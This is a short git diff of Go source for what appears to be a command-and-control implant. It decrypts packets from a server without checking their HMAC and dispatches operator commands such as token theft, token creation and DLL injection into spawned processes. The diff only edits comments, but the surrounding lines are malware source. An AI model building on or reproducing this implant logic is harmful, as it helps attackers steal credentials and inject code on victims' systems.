@@ -28,7 +28,7 @@ func main() {
 					// hmacHash, useless
 					_ = respByte[totalLen-util.HmacHashLen:]
 					//fmt.Printf("hmac hash: %v\n", hmacHash)
-					//TODO check the hmachash
+					// TODO check the hmachash
 					restBytes := respByte[:totalLen-util.HmacHashLen]
 					decrypted := packet.DecryptPacket(restBytes)
 					// first 4 bytes timestamp,useless
@@ -74,7 +74,6 @@ func main() {
 								execErr = command.StealToken(cmdBuf)
 							case command.CMD_TYPE_MAKE_TOKEN:
 								execErr = command.MakeToken(cmdBuf)
-							// TODO have no idea about how to deal with token
 							case command.CMD_TYPE_SPAWN_TOKEN_X64:
 								execErr = command.SpawnAndInjectDll(cmdBuf, true, false)
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
